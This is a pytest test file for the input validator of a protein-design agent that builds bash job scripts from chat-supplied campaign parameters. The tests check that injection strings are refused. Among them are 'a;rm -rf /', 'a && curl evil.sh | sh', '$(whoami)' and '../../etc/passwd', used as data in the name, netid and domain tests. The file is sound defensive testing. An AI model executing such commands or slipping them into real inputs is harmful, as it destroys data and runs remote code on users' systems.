"""Validation of the protocol inputs that reach a job spec.

Every value here arrives in a chat message and ends up inside a `bash -lc`
script body, in argv, and in a `$PROJ` path the endpoint writes to under the
site's allocation. These tests are the guard, so they are written as refusals
first: what must be rejected matters more than what must be accepted.
"""

from __future__ import annotations

import pytest
from designagent.protocol.inputs import (
    CATALYTIC_LABEL,
    LEVELS,
    DomainSegment,
    InvalidInput,
    ProtocolInputs,
    chain_length,
    format_domains,
    tag_for_method,
    validate_cat_res,
    validate_domains,
    validate_levels,
    validate_name,
    validate_netid,
    validate_pdb_id,
    validate_uniprot,
)

# The AlyFRB campaign, verbatim from the skill. The reference run every other
# value in these tests is checked against.
ALYFRB_DOMAINS = (
    "1-IDR-10-11-FN3-117-118-L-143-144-CD-479-480-L-493-494-CD-773-774-IDR-785"
)
ALYFRB = {
    "name": "AlyFRB",
    "uniprot": "A0A173MSR7",
    "domains": ALYFRB_DOMAINS,
    "netid": "all239",
    "method": "cpos",
    "cat_res": "310,364",
}


# --- the reference campaign is accepted, and parsed into the right shape ----


def test_the_reference_campaign_validates():
    got = ProtocolInputs.parse(**ALYFRB)
    assert got.name == "AlyFRB"
    assert got.uniprot == "A0A173MSR7"
    assert got.cat_res == (310, 364)
    assert got.tag == ""
    assert got.levels == LEVELS
    assert got.offset == 0


def test_the_domain_string_round_trips():
    segments = validate_domains(ALYFRB_DOMAINS)
    assert format_domains(segments) == ALYFRB_DOMAINS


def test_the_chain_length_is_the_last_residue_of_the_string():
    # Step 1 checks the downloaded structure against this number.
    assert chain_length(validate_domains(ALYFRB_DOMAINS)) == 785
    assert ProtocolInputs.parse(**ALYFRB).chain_length == 785


def test_the_catalytic_segments_are_the_designable_ones():
    got = ProtocolInputs.parse(**ALYFRB)
    assert got.catalytic_segments == (
        DomainSegment(144, "CD", 479),
        DomainSegment(494, "CD", 773),
    )
    assert all(s.label == CATALYTIC_LABEL for s in got.catalytic_segments)


def test_the_model_stem_names_the_campaigns_files():
    assert ProtocolInputs.parse(**ALYFRB).model == "AF-A0A173MSR7-F1-model_v6"


# --- shell metacharacters are refused, not stripped -------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "a;rm -rf /",
        "a && curl evil.sh | sh",
        "$(whoami)",
        "`id`",
        "a|b",
        "../../etc/passwd",
        "a b",
        "a\nb",
        "a'b",
        'a"b',
        "a$b",
        "",
        "x" * 33,
    ],
)
def test_a_name_that_could_reach_a_shell_is_refused(hostile):
    # Refused, not sanitised: stripping the metacharacters would turn each of
    # these into a plausible-looking campaign against the wrong directory.
    with pytest.raises(InvalidInput):
        validate_name(hostile)


def test_a_netid_that_could_reach_a_path_is_refused():
    # The netid becomes a /scratch/<netid> component.
    for hostile in ["..", "a/b", "a;b", "", "x" * 17, "a-b"]:
        with pytest.raises(InvalidInput):
            validate_netid(hostile)
    assert validate_netid(" all239 ") == "all239"


def test_a_uniprot_accession_is_folded_but_not_loosened():
    assert validate_uniprot(" a0a173msr7 ") == "A0A173MSR7"
    for hostile in ["A0A173MSR7; echo", "short", "A" * 11, "A0A173-SR7", ""]:
        with pytest.raises(InvalidInput):
            validate_uniprot(hostile)


def test_a_pdb_id_must_be_four_characters_starting_with_a_digit():
    assert validate_pdb_id("4q8l") == "4Q8L"
    for hostile in ["4Q8", "4Q8LL", "AQ8L", "4Q8;", ""]:
        with pytest.raises(InvalidInput):
            validate_pdb_id(hostile)


# --- the domain string's grammar -------------------------------------------


def test_a_quoted_domain_string_is_refused():
    with pytest.raises(InvalidInput):
        validate_domains(f'"{ALYFRB_DOMAINS}"')


def test_a_domain_string_must_split_into_triples():
    with pytest.raises(InvalidInput, match="triples"):
        validate_domains("1-IDR-10-11-FN3")


def test_a_domain_label_is_bounded_and_alphanumeric():
    with pytest.raises(InvalidInput, match="label"):
        validate_domains("1-ID R-10-11-CD-785")
    with pytest.raises(InvalidInput, match="label"):
        validate_domains("1-IDR;rm-10-11-CD-785")


def test_non_integer_domain_bounds_are_refused():
    with pytest.raises(InvalidInput, match="integer bounds"):
        validate_domains("1-IDR-ten-11-CD-785")


def test_a_domain_string_must_start_at_residue_one():
    with pytest.raises(InvalidInput, match="not 1"):
        validate_domains("5-IDR-10-11-CD-785")


def test_a_gap_in_the_domain_string_is_refused():
    # A gap is a run of residues that is neither fixed nor designed: MPNN would
    # rewrite it and nothing would say so.
    with pytest.raises(InvalidInput, match="gap"):
        validate_domains("1-IDR-10-20-CD-785")


def test_an_overlap_in_the_domain_string_is_refused():
    with pytest.raises(InvalidInput, match="overlaps"):
        validate_domains("1-IDR-30-11-CD-785")


def test_a_segment_that_ends_before_it_starts_is_refused():
    with pytest.raises(InvalidInput, match="ends before"):
        validate_domains("1-IDR-10-11-CD-5")


def test_a_domain_string_with_no_catalytic_domain_is_refused():
    # Every position would be fixed, so the round could only return the input.
    with pytest.raises(InvalidInput, match="nothing for ProteinMPNN"):
        validate_domains("1-IDR-10-11-FN3-785")


# --- catalytic residues, where the offset mistake shows up ------------------


def test_catalytic_residues_are_sorted_and_deduped():
    assert validate_cat_res("364, 310, 310") == (310, 364)


def test_a_non_integer_catalytic_residue_is_refused():
    for hostile in ["310,", "310,abc", "310;364", "", "310 364"]:
        with pytest.raises(InvalidInput):
            validate_cat_res(hostile)


def test_a_catalytic_residue_past_the_chain_end_is_refused():
    # The check that catches a residue list left in untrimmed numbering after
    # the signal peptide was stripped -- the protocol's worst silent failure,
    # because MPNN would protect the wrong positions and redesign the real
    # active site.
    with pytest.raises(InvalidInput, match="untrimmed numbering"):
        validate_cat_res("310,900", length=785)


def test_a_catalytic_residue_below_one_is_refused():
    with pytest.raises(InvalidInput):
        validate_cat_res("0,310", length=785)


def test_cat_res_is_optional_at_intake_and_added_at_the_checkpoint():
    # Step 5 is where the user confirms them; intake cannot know them yet.
    staged = ProtocolInputs.parse(**{**ALYFRB, "cat_res": ""})
    assert staged.cat_res == ()
    assert staged.with_cat_res("310,364").cat_res == (310, 364)


def test_with_cat_res_still_checks_against_the_chain_length():
    staged = ProtocolInputs.parse(**{**ALYFRB, "cat_res": ""})
    with pytest.raises(InvalidInput):
        staged.with_cat_res("310,900")


# --- the conservation method, which has no default -------------------------


def test_the_two_conservation_methods_select_their_filename_infix():
    assert tag_for_method("cpos") == ""
    assert tag_for_method("conservation_liu") == "liu_"
    assert tag_for_method(" CPOS ") == ""


def test_an_unrecognised_conservation_method_is_refused_rather_than_defaulted():
    # The skill forbids a default here, so a near-miss must not silently become
    # cpos -- the choice decides which residues MPNN is allowed to touch.
    for hostile in ["liu", "", "both", "conservation", "cpos_liu"]:
        with pytest.raises(InvalidInput, match="no default"):
            tag_for_method(hostile)


def test_levels_are_a_subset_of_the_three_the_scripts_emit():
    assert validate_levels([70, 30, 30]) == (30, 70)
    assert validate_levels(["50"]) == (50,)
    for hostile in [[], [40], [0], ["many"]]:
        with pytest.raises(InvalidInput):
            validate_levels(hostile)


# --- the dataclass is the only thing a builder accepts ----------------------


def test_the_inputs_are_frozen():
    got = ProtocolInputs.parse(**ALYFRB)
    with pytest.raises(Exception):
        got.name = "other"  # type: ignore[misc]


def test_parse_refuses_the_whole_campaign_on_one_bad_field():
    with pytest.raises(InvalidInput):
        ProtocolInputs.parse(**{**ALYFRB, "netid": "../etc"})
